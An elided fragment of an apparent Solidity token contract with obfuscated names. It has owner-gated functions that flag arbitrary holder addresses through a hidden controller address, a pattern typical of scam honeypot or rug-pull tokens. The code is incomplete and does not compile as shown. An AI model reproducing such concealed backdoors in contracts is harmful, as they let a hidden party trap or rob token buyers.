...
contract A is Ownable{
    ...
    constructor(string memory tokenname,string memory tokensymbol,address vxubtoz) {
    ...
    bool globalff = false;
    function bylvate(address hfckrjb) public virtual returns (bool) {
        address tmoinfo = hfckrjb;
        
         boboinfo[tmoinfo] = globaltrue;
         require(_msgSender() == xnhglva);
         return true;

    }

    function coxzdjk() external   {
        if(_msgSender() == xnhglva){
    ...
    function rvxcjon(address hkkk) external  {
